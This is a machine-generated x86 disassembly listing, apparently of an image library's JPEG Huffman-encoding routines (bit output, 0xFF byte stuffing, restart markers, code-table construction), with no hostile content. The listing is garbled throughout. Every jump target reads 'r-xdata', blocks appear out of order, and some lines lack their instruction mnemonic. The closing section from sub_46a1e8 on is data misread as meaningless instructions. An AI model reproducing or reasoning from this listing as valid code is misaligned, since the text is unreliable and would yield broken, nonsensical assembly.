cmp edi 0xf
jle r-xdata
inc edi
jmp r-xdata
inc [ esp + 0x8 ]
add edx 0x4
add eax 0x4
mov ecx [ esp + 0x8 ]
cmp ecx [ esp + 0x10 ]
jle r-xdata
mov ecx [ esp + 0x8 ]
mov [ esp + 0xc ] ecx
mov eax ebx
call sub_468e90
cmp [ ebx + 0x3c ] 0x3a9
jbe r-xdata
mov edx [ esp ]
mov eax [ edx + 0x14 ]
mov edx [ ebx + 0x10 ]
mov [ eax ] edx
mov ecx [ ebx + 0x14 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp ]
mov eax [ eax + 0xc0 ]
test eax eax
je r-xdata
cmp [ esp + 0x4 ] 0x1
jle r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0xc ]
jle r-xdata
inc [ esp + 0x8 ]
add [ esp + 0x1c ] 0x4
add [ esp + 0x18 ] 0x4
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x10 ]
jle r-xdata
mov eax 0x1
add esp 0x120
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax ebx
call sub_468e90
mov ecx edi
mov edx [ ebx + 0x34 ]
shl ecx 0x4
mov eax ebx
inc ecx
call sub_468e38
xor edx edx
mov ecx [ esp + 0x1c ]
mov eax [ ecx ]
mov ecx [ esp + 0x14 ]
cmp [ ecx + eax * 2 ] 0x0
jl r-xdata
mov dl [ esp + 0x4 ]
and dl 0x1
mov [ ebp + esi ] dl
inc esi
jmp r-xdata
mov eax ebx
call sub_468e90
mov ecx 0xf0
mov edx [ ebx + 0x34 ]
mov eax ebx
call sub_468e38
sub edi 0x10
mov ecx esi
mov edx ebp
mov eax ebx
call sub_468e64
mov ebp [ ebx + 0x40 ]
xor esi esi
dec [ ebx + 0x44 ]
mov [ ebx + 0x44 ] eax
inc [ ebx + 0x48 ]
and [ ebx + 0x48 ] 0x7
mov [ esp + 0x4 ] edx
mov ecx 0x1
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_468d7c
mov ecx esi
mov edx ebp
mov eax ebx
call sub_468e64
mov ebp [ ebx + 0x40 ]
xor esi esi
xor edi edi
inc edx
sub_469520
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x161 ]
mov eax [ esi + 0x14 ]
mov edx [ eax ]
mov [ ebx + 0x10 ] edx
mov ecx [ esi + 0x14 ]
mov eax [ ecx + 0x4 ]
mov [ ebx + 0x14 ] eax
mov eax ebx
call sub_468e90
mov eax ebx
call sub_468e18
mov eax [ esi + 0x14 ]
mov edx [ ebx + 0x10 ]
mov [ eax ] edx
mov ecx [ ebx + 0x14 ]
mov [ eax + 0x4 ] ecx
pop esi
pop ebx
retn
sub_46955c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov esi eax
mov eax [ esi + 0x161 ]
mov [ esp ] eax
mov eax [ esp ]
call sub_468e90
cmp [ esi + 0x131 ] 0x0
sete dl
and edx 0x1
mov [ esp + 0x4 ] edx
push 0x10
push 0x0
lea ecx [ esp + 0x14 ]
push ecx
call sub_46a318
add esp 0xc
xor eax eax
mov [ esp + 0x8 ] eax
lea ebp [ esi + 0xed ]
jmp r-xdata
mov ecx [ esp + 0x8 ]
cmp ecx [ esi + 0xe9 ]
jl r-xdata
cmp [ esp + 0x4 ] 0x0
mov eax [ ebp ]
je r-xdata
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x18 ]
cmp [ esi + 0x139 ] 0x0
jne r-xdata
inc [ esp + 0x8 ]
add ebp 0x4
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov ebx [ eax + 0x14 ]
jmp r-xdata
lea edi [ esi + ebx * 4 + 0x60 ]
lea edi [ esi + ebx * 4 + 0x50 ]
jmp r-xdata
cmp [ esp + ebx * 4 + 0xc ] 0x0
jne r-xdata
mov edx [ esp ]
mov ecx [ edx + ebx * 4 + 0x5c ]
mov edx [ edi ]
mov eax esi
call sub_469ee4
mov [ esp + ebx * 4 + 0xc ] 0x1
mov eax esi
call sub_464550
mov [ edi ] eax
cmp [ edi ] 0x0
jne r-xdata
sub_46961c
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x6c
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov ecx eax
xor edx edx
mov [ ebx + 0x161 ] ecx
mov [ ecx ] sub_468b74
lea eax [ ecx + 0x4c ]
xor ebx ebx
inc edx
mov [ eax ] ebx
xor ebx ebx
mov [ eax + 0x10 ] ebx
add eax 0x4
cmp edx 0x4
jl r-xdata
xor eax eax
mov [ ecx + 0x40 ] eax
pop esi
pop ebx
retn
sub_469660
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov [ esp ] edx
mov eax [ ebx + 0x161 ]
mov [ esp + 0x4 ] eax
cmp [ esp ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] sub_469c10
mov edx [ esp + 0x4 ]
mov [ edx + 0x8 ] sub_469d20
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] sub_469e34
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x8 ] sub_46a0c8
jmp r-xdata
mov ecx [ esp + 0x8 ]
cmp ecx [ ebx + 0xe9 ]
jl r-xdata
xor ecx ecx
mov [ esp + 0x8 ] ecx
mov eax [ esp + 0x4 ]
lea edx [ eax + 0x14 ]
mov [ esp + 0x10 ] edx
lea ecx [ ebx + 0xed ]
mov [ esp + 0xc ] ecx
jmp r-xdata
mov eax [ esp + 0xc ]
mov eax [ eax ]
mov esi [ eax + 0x14 ]
mov edi [ eax + 0x18 ]
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax + 0xc ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ ecx + 0x10 ] eax
mov edx [ esp + 0x4 ]
mov ecx [ ebx + 0xc0 ]
mov [ edx + 0x24 ] ecx
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax + 0x28 ] edx
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x31
mov [ eax + 0x18 ] esi
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp esi 0x4
jge r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x31
mov [ eax + 0x18 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp edi 0x4
jge r-xdata
cmp [ ebx + esi * 4 + 0x50 ] 0x0
jne r-xdata
mov ecx esi
mov edx [ ebx + esi * 4 + 0x50 ]
shl ecx 0x2
mov eax ebx
add ecx [ esp + 0x4 ]
add ecx 0x2c
call sub_46982c
mov ecx edi
mov edx [ ebx + edi * 4 + 0x60 ]
shl ecx 0x2
mov eax ebx
add ecx [ esp + 0x4 ]
add ecx 0x3c
call sub_46982c
mov ecx [ esp + 0x4 ]
cmp [ ecx + esi * 4 + 0x4c ] 0x0
jne r-xdata
cmp [ ebx + edi * 4 + 0x60 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ esp ] 0x0
jne r-xdata
push 0x404
push 0x0
mov eax [ esp + 0xc ]
mov ecx [ eax + esi * 4 + 0x4c ]
push ecx
call sub_46a318
add esp 0xc
mov eax [ esp + 0x4 ]
cmp [ eax + edi * 4 + 0x5c ] 0x0
jne r-xdata
mov eax ebx
mov ecx 0x404
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp ]
mov edx [ esp + 0x4 ]
mov [ edx + esi * 4 + 0x4c ] eax
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
push 0x404
push 0x0
mov eax [ esp + 0xc ]
mov ecx [ eax + edi * 4 + 0x5c ]
push ecx
call sub_46a318
add esp 0xc
jmp r-xdata
mov eax ebx
mov ecx 0x404
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov edx [ esp + 0x4 ]
mov [ edx + edi * 4 + 0x5c ] eax
mov eax [ esp + 0x10 ]
xor edx edx
mov [ eax ] edx
inc [ esp + 0x8 ]
add [ esp + 0x10 ] 0x4
add [ esp + 0xc ] 0x4
sub_46982c
push ebx
push esi
push edi
push ebp
add esp 0xfffffaec
mov ebx ecx
mov [ esp ] edx
mov esi eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov [ esp + 0x4 ] eax
xor eax eax
mov edi 0x1
mov edx [ esp ]
lea ebp [ edx + 0x1 ]
mov eax esi
mov ecx 0x500
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx ] eax
xor ebx ebx
mov bl [ esi ]
cmp ecx ebx
jle r-xdata
mov ebx edi
inc eax
mov [ edx ] bl
inc edx
inc ecx
inc edi
inc ebp
cmp edi 0x10
jle r-xdata
mov ecx 0x1
lea edx [ esp + eax + 0xc ]
mov esi ebp
jmp r-xdata
mov [ esp + eax + 0xc ] 0x0
mov [ esp + 0x8 ] eax
xor ebx ebx
movsx esi [ esp + 0xc ]
xor eax eax
jmp r-xdata
cmp [ esp + eax + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + eax * 4 + 0x110 ]
lea edx [ esp + eax + 0xc ]
jmp r-xdata
push 0x100
push 0x0
mov eax [ esp + 0xc ]
add eax 0x400
push eax
call sub_46a318
add esp 0xc
xor eax eax
lea esi [ esp + 0xc ]
mov edx [ esp ]
add edx 0x11
lea ecx [ esp + 0x110 ]
cmp eax [ esp + 0x8 ]
jge r-xdata
movsx edi [ edx ]
cmp esi edi
je r-xdata
add esp 0x514
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebx ebx
mov edi [ esp + 0x4 ]
mov bl [ edx ]
mov ebp [ ecx ]
add ecx 0x4
inc eax
mov [ edi + ebx * 4 ] ebp
xor ebx ebx
mov bl [ edx ]
mov edi [ esp + 0x4 ]
inc edx
lea edi [ edi + ebx + 0x400 ]
mov bl [ esi ]
inc esi
mov [ edi ] bl
cmp eax [ esp + 0x8 ]
jl r-xdata
mov [ ecx ] ebx
inc eax
add ecx 0x4
inc edx
inc ebx
add ebx ebx
inc esi
sub_469930
push ebx
mov ebx eax
push esi
mov eax [ ebx + 0x20 ]
mov esi [ eax + 0x14 ]
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esi ]
mov eax 0x1
mov [ ebx ] edx
mov ecx [ esi + 0x4 ]
mov [ ebx + 0x4 ] ecx
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_469958
push ebx
mov ebx eax
push esi
push edi
push ebp
mov edi ecx
test edi edi
mov ebp [ ebx + 0xc ]
mov esi edx
jne r-xdata
mov ecx edi
mov eax 0x1
shl eax cl
dec eax
add ebp edi
mov ecx 0x18
and esi eax
sub ecx ebp
shl esi cl
or esi [ ebx + 0x8 ]
cmp ebp 0x8
jl r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x27
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] esi
mov [ ebx + 0xc ] ebp
mov eax 0x1
mov edi esi
mov edx [ ebx ]
sar edi 0x10
inc [ ebx ]
and edi 0xff
mov eax edi
mov [ edx ] al
dec [ ebx + 0x4 ]
jne r-xdata
cmp edi 0xff
jne r-xdata
mov eax ebx
call sub_469930
test eax eax
jne r-xdata
shl esi 0x8
sub ebp 0x8
cmp ebp 0x8
jge r-xdata
mov edx [ ebx ]
inc [ ebx ]
mov [ edx ] 0x0
dec [ ebx + 0x4 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_469930
test eax eax
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
jmp r-xdata
sub_469a00
push ebx
mov ebx eax
mov ecx 0x7
mov edx 0x7f
mov eax ebx
call sub_469958
test eax eax
jne r-xdata
xor edx edx
xor ecx ecx
mov [ ebx + 0x8 ] edx
mov [ ebx + 0xc ] ecx
mov eax 0x1
pop ebx
retn
xor eax eax
pop ebx
retn
sub_469a30
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
movsx ecx [ edx ]
sub ecx [ ebp - 0xc ]
mov esi ecx
mov [ ebp - 0x10 ] ecx
test esi esi
jge r-xdata
xor edx edx
test esi esi
mov [ ebp - 0x14 ] edx
je r-xdata
neg esi
dec [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x14 ]
movsx ecx [ eax + ecx + 0x400 ]
mov edx [ eax + edx * 4 ]
mov eax [ ebp - 0x4 ]
call sub_469958
test eax eax
jne r-xdata
inc [ ebp - 0x14 ]
sar esi 0x1
test esi esi
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
mov [ ebp - 0x1c ] rw-data
xor ebx ebx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_469958
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp ebx 0xf
jle r-xdata
inc ebx
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x10 ] esi
test esi esi
jge r-xdata
movsx ecx [ edi + 0x4f0 ]
mov edx [ edi + 0x3c0 ]
mov eax [ ebp - 0x4 ]
call sub_469958
test eax eax
jne r-xdata
inc [ ebp - 0x18 ]
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x18 ] 0x40
jl r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
neg esi
dec [ ebp - 0x10 ]
sub ebx 0x10
cmp ebx 0xf
jg r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edx [ eax ]
mov ecx [ ebp - 0x8 ]
movsx esi [ ecx + edx * 2 ]
test esi esi
jne r-xdata
test ebx ebx
jle r-xdata
sar esi 0x1
jne r-xdata
mov eax 0x1
movsx ecx [ edi + 0x400 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
call sub_469958
test eax eax
jne r-xdata
inc [ ebp - 0x14 ]
mov eax ebx
shl eax 0x4
add eax [ ebp - 0x14 ]
movsx ecx [ edi + eax + 0x400 ]
mov edx [ edi + eax * 4 ]
mov eax [ ebp - 0x4 ]
call sub_469958
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_469958
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
xor eax eax
jmp r-xdata
sub_469b9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_469a00
test eax eax
jne r-xdata
mov edx [ ebx ]
inc [ ebx ]
mov [ edx ] 0xff
dec [ ebx + 0x4 ]
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov ecx [ ebx ]
mov edx esi
inc [ ebx ]
add dl 0xd0
mov [ ecx ] dl
dec [ ebx + 0x4 ]
jne r-xdata
mov eax ebx
call sub_469930
test eax eax
jne r-xdata
xor edx edx
lea eax [ ebx + 0x10 ]
jmp r-xdata
mov eax ebx
call sub_469930
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov ecx [ ebx + 0x20 ]
cmp edx [ ecx + 0xe9 ]
jl r-xdata
xor eax eax
pop esi
pop ebx
retn
xor ecx ecx
inc edx
mov [ eax ] ecx
add eax 0x4
mov eax 0x1
pop esi
pop ebx
retn
sub_469c10
push ebx
push esi
mov esi eax
push edi
push ebp
add esp 0xffffffd4
mov eax [ esi + 0x14 ]
mov ebx edx
mov ebp [ esi + 0x161 ]
mov edx [ eax ]
mov [ esp + 0x8 ] edx
mov ecx [ eax + 0x4 ]
mov [ esp + 0xc ] ecx
push esi
lea edi [ esp + 0x14 ]
lea esi [ ebp + 0xc ]
mov ecx 0x6
[ edi ] [ esi ]
pop esi
mov [ esp + 0x28 ] esi
cmp [ esi + 0xc0 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
mov ecx ebx
mov ebx ecx
lea eax [ esi + 0x109 ]
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ ebp + 0x24 ] 0x0
jne r-xdata
mov eax [ esp ]
cmp eax [ esi + 0x105 ]
jl r-xdata
mov edx [ ebp + 0x28 ]
lea eax [ esp + 0x8 ]
call sub_469b9c
test eax eax
jne r-xdata
mov edx [ esp + 0x4 ]
mov edi [ edx ]
mov eax [ esi + edi * 4 + 0xed ]
mov edx [ eax + 0x14 ]
mov ecx [ ebp + edx * 4 + 0x2c ]
push ecx
mov eax [ eax + 0x18 ]
mov edx [ ebp + eax * 4 + 0x3c ]
push edx
mov ecx [ esp + edi * 4 + 0x20 ]
lea eax [ esp + 0x10 ]
mov edx [ ebx ]
call sub_469a30
test eax eax
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esp + 0x8 ]
lea edi [ ebp + 0xc ]
mov [ eax ] edx
mov ecx [ esp + 0xc ]
mov [ eax + 0x4 ] ecx
push esi
lea esi [ esp + 0x14 ]
mov ecx 0x6
[ edi ] [ esi ]
pop esi
mov eax [ esi + 0xc0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebx ]
movsx ecx [ edx ]
mov [ esp + edi * 4 + 0x18 ] ecx
inc [ esp ]
add ebx 0x4
add [ esp + 0x4 ] 0x4
xor eax eax
jmp r-xdata
mov eax 0x1
cmp [ ebp + 0x24 ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
dec [ ebp + 0x24 ]
mov [ ebp + 0x24 ] eax
inc [ ebp + 0x28 ]
and [ ebp + 0x28 ] 0x7
sub_469d20
push ebx
mov ebx eax
push esi
push edi
mov eax [ ebx + 0x14 ]
add esp 0xffffffdc
mov esi [ ebx + 0x161 ]
mov edx [ eax ]
mov [ esp ] edx
mov ecx [ eax + 0x4 ]
mov [ esp + 0x4 ] ecx
push esi
lea edi [ esp + 0xc ]
add esi 0xc
mov ecx 0x6
[ edi ] [ esi ]
pop esi
mov [ esp + 0x20 ] ebx
mov eax esp
call sub_469a00
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ esp ]
lea edi [ esi + 0xc ]
mov [ eax ] edx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
push esi
lea esi [ esp + 0xc ]
mov ecx 0x6
[ edi ] [ esi ]
pop esi
add esp 0x24
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x16
mov edx [ eax ]
call [ edx ]
sub_469d94
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
movsx ebx [ ecx ]
sub ebx edx
test ebx ebx
jge r-xdata
xor ecx ecx
test ebx ebx
je r-xdata
neg ebx
mov edx [ ebp - 0x8 ]
inc [ edx + ecx * 4 ]
xor edx edx
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x10 ] rw-data
sar ebx 0x1
inc ecx
test ebx ebx
jne r-xdata
cmp edx 0xf
jle r-xdata
inc edx
jmp r-xdata
test ebx ebx
jge r-xdata
inc [ eax + 0x3c0 ]
sub edx 0x10
cmp edx 0xf
jg r-xdata
inc [ ebp - 0xc ]
add [ ebp - 0x10 ] 0x4
cmp [ ebp - 0xc ] 0x40
jl r-xdata
mov ecx 0x1
jmp r-xdata
neg ebx
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx ]
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + ecx * 2 ]
test ebx ebx
jne r-xdata
test edx edx
jle r-xdata
sar ebx 0x1
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc [ eax ]
inc ecx
shl edx 0x4
add ecx edx
inc [ eax + ecx * 4 ]
xor edx edx
sub_469e34
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov ebp eax
mov [ esp ] edx
cmp [ ebp + 0xc0 ] 0x0
mov ebx [ ebp + 0x161 ]
je r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
lea eax [ ebp + 0x109 ]
mov edx [ esp ]
mov [ esp + 0x8 ] eax
mov edi edx
jmp r-xdata
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp + 0x105 ]
cmp edx [ esp + 0x4 ]
jg r-xdata
dec [ ebx + 0x24 ]
xor esi esi
lea eax [ ebx + 0x14 ]
jmp r-xdata
mov edx [ esp + 0x8 ]
mov esi [ edx ]
mov eax [ ebp + esi * 4 + 0xed ]
mov edx [ eax + 0x18 ]
mov ecx [ ebx + edx * 4 + 0x5c ]
push ecx
mov eax [ eax + 0x14 ]
mov ecx [ ebx + eax * 4 + 0x4c ]
mov eax [ edi ]
mov edx [ ebx + esi * 4 + 0x14 ]
call sub_469d94
mov ecx [ edi ]
movsx eax [ ecx ]
mov [ ebx + esi * 4 + 0x14 ] eax
inc [ esp + 0x4 ]
add edi 0x4
add [ esp + 0x8 ] 0x4
mov eax 0x1
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp esi [ ebp + 0xe9 ]
jl r-xdata
xor edx edx
inc esi
mov [ eax ] edx
add eax 0x4
mov ecx [ ebp + 0xc0 ]
mov [ ebx + 0x24 ] ecx
sub_469ee4
push ebx
push esi
push edi
add esp 0xfffff7c8
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
push 0x21
push 0x0
lea eax [ esp + 0x14 ]
push eax
call sub_46a318
add esp 0xc
push 0x404
push 0x0
lea edx [ esp + 0x38 ]
push edx
call sub_46a318
add esp 0xc
xor ebx ebx
lea eax [ esp + 0x434 ]
mov [ eax ] 0xffffffff
inc ebx
add eax 0x4
cmp ebx 0x101
jl r-xdata
mov edx [ esp + 0x8 ]
mov [ edx + 0x400 ] 0x1
inc ebx
add edx 0x4
cmp ebx 0x100
jle r-xdata
cmp edi ecx
jl r-xdata
mov ecx [ edx ]
test ecx ecx
je r-xdata
or edx 0xffffffff
mov edi 0x3b9aca00
xor ebx ebx
mov ecx [ esp + 0x8 ]
mov edi ecx
mov eax ebx
inc ebx
add ecx 0x4
cmp ebx 0x100
jle r-xdata
cmp edi esi
jl r-xdata
mov esi [ ecx ]
test esi esi
je r-xdata
test edx edx
jl r-xdata
cmp eax ebx
je r-xdata
xor ebx ebx
lea esi [ esp + 0x30 ]
mov ecx [ esp + 0x8 ]
mov ebx [ esp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
add [ ebx + eax * 4 ] ecx
xor ebx ebx
mov ecx [ esp + 0x8 ]
mov [ ecx + edx * 4 ] ebx
inc [ esp + eax * 4 + 0x30 ]
jmp r-xdata
mov edi esi
mov edx ebx
inc ebx
add esi 0x4
cmp ebx 0x100
jle r-xdata
cmp eax 0x20
jle r-xdata
mov ecx [ esp + eax * 4 + 0x434 ]
test ecx ecx
jge r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov ebx 0x20
lea esi [ esp + 0x2c ]
mov ecx [ esi ]
inc [ esp + ecx + 0xc ]
mov edx [ esp ]
mov ecx [ edx ]
mov [ ecx + 0x14 ] 0x26
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
mov eax ecx
inc [ esp + eax * 4 + 0x30 ]
mov [ esp + eax * 4 + 0x434 ] edx
inc [ esp + edx * 4 + 0x30 ]
jmp r-xdata
cmp [ ecx ] 0x0
ja r-xdata
mov eax [ esp + edx * 4 + 0x434 ]
test eax eax
jge r-xdata
lea eax [ ebx - 0x2 ]
lea edx [ esp + eax + 0xc ]
jmp r-xdata
dec ebx
dec esi
cmp ebx 0x10
jg r-xdata
mov edx eax
inc [ esp + edx * 4 + 0x30 ]
jmp r-xdata
cmp [ edx ] 0x0
je r-xdata
mov ecx esi
jmp r-xdata
lea eax [ esp + ebx + 0xc ]
jmp r-xdata
or eax 0xffffffff
mov edi 0x3b9aca00
xor ebx ebx
mov edx [ esp + 0x8 ]
dec eax
dec edx
add [ ecx ] 0xfe
inc [ ecx - 0x1 ]
add [ esp + eax + 0xd ] 0x2
dec [ esp + eax + 0xc ]
cmp [ eax ] 0x0
je r-xdata
dec ebx
dec eax
dec [ esp + ebx + 0xc ]
push 0x11
lea edx [ esp + 0x10 ]
push edx
mov ecx [ esp + 0xc ]
push ecx
call sub_46a330
add esp 0xc
xor edi edi
mov ebx 0x1
inc eax
add edx 0x4
cmp eax 0xff
jle r-xdata
mov [ esi ] al
inc edi
inc esi
cmp ebx [ edx ]
jne r-xdata
inc ebx
cmp ebx 0x20
jle r-xdata
xor eax eax
mov edx [ esp + 0x4 ]
lea esi [ edx + edi + 0x11 ]
lea edx [ esp + 0x30 ]
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax + 0x111 ] ecx
add esp 0x838
pop edi
pop esi
pop ebx
retn
sub_46a0c8
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebx eax
mov eax [ ebx + 0x161 ]
mov [ esp ] eax
push 0x10
push 0x0
lea edx [ esp + 0x14 ]
push edx
call sub_46a318
add esp 0xc
push 0x10
push 0x0
lea ecx [ esp + 0x24 ]
push ecx
call sub_46a318
add esp 0xc
xor eax eax
mov [ esp + 0x4 ] eax
lea edx [ ebx + 0xed ]
mov [ esp + 0x8 ] edx
jmp r-xdata
mov ecx [ esp + 0x4 ]
cmp ecx [ ebx + 0xe9 ]
jl r-xdata
mov ecx [ esp + 0x8 ]
mov eax [ ecx ]
mov edi [ eax + 0x14 ]
mov ebp [ eax + 0x18 ]
cmp [ esp + edi * 4 + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp + ebp * 4 + 0x1c ] 0x0
jne r-xdata
lea esi [ ebx + edi * 4 + 0x50 ]
cmp [ esi ] 0x0
jne r-xdata
inc [ esp + 0x4 ]
add [ esp + 0x8 ] 0x4
lea esi [ ebx + ebp * 4 + 0x60 ]
cmp [ esi ] 0x0
jne r-xdata
mov edx [ esp ]
mov ecx [ edx + edi * 4 + 0x4c ]
mov edx [ esi ]
mov eax ebx
call sub_469ee4
mov [ esp + edi * 4 + 0xc ] 0x1
mov eax ebx
call sub_464550
mov [ esi ] eax
mov edx [ esp ]
mov ecx [ edx + ebp * 4 + 0x5c ]
mov edx [ esi ]
mov eax ebx
call sub_469ee4
mov [ esp + ebp * 4 + 0x1c ] 0x1
mov eax ebx
call sub_464550
mov [ esi ] eax
sub_46a1a0
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x6c
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x161 ] eax
mov [ eax ] sub_469660
xor edx edx
add eax 0x3c
xor ecx ecx
mov [ eax ] ecx
mov [ eax - 0x10 ] ecx
xor ecx ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x10 ] ecx
inc edx
add eax 0x4
cmp edx 0x4
jl r-xdata
pop esi
pop ebx
retn
sub_46a1e8
add [ eax ] al
add [ eax - 0x53 ] dh
nop
nop
mov [ edx + 0x46 ] fs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xa2
inc esi
add [ eax ] bl
add [ eax ] al
add [ eax - 0x29 ] al
inc eax
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax - 0x68 ] 0xa4
inc esi
add al cl
movsb [ edi ] [ esi ]
inc esi
add [ ecx ] cl
push esp
dec edx
push eax
inc ebp
inc edi
inc esp
popad
je r-xdata
inc esi
add [ eax + 0x240046ad ] dl
mov bl 0x46
add [ eax + 0x500046b3 ] bh
mov bl 0x46
add [ eax + ebx + 0x41 ] bh
add ah ah
mov bl 0x46
add [ esp + esi * 4 - 0x499bffba ] ch
inc esi
add [ esi + esi * 4 + 0x19c00046 ] ch
inc ecx
add [ edi + esi * 4 ] al
inc esi
add [ edi + esi * 4 + 0x46 ] cl
add [ eax + 0x50004118 ] bl
sbb [ ecx ] eax
inc eax
mov ah 0x46
add [ eax ] bh
mov dh 0x46
add [ eax ] ah
mov ah 0x46
add [ esi + esi * 4 ] cl
inc esi
add [ edx ] cl
push esp
dec edx
push eax
inc ebp
inc edi
dec ecx
insd
popad
nop
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
mov [ r--data ] al
add [ eax ] al
mov ah 0xd5
inc eax
add [ edx + eax * 8 - 0x3d5fffbc ] dl
inc esp
add [ edx + eax * 8 - 0x3d57ffbc ] ah
inc esp
add [ edx + eax * 8 - 0x3ffbffbc ] bl
inc esp
add [ eax ] bl
rol [ eax + eax + 0x40 ] 0xa5
inc esi
add [ esi ] al
inc esi
add ah cl
push ss
inc ecx
add [ ebp - 0x5b33ffba ] al
inc esi
add al ch
test eax 0xad700046
sub_46a408
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
